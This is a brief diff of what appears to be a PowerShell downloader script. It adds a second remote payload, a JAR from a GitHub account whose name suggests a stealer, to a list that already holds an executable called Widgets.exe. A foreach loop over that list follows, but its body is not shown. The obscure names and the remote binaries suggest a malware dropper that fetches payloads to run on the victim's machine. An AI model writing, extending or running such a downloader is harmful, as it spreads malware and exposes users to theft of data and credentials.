@@ -1,5 +1,6 @@
 $meshki = @(
-    "https://github.com/dfgsgsdfgfd/test/raw/refs/heads/main/Widgets.exe"
+    "https://github.com/dfgsgsdfgfd/test/raw/refs/heads/main/Widgets.exe",
+"https://github.com/JqrkaSt3al/jarkacode/raw/refs/heads/main/JARKA.jar"
 )
 
 foreach ($sun in $meshki) {
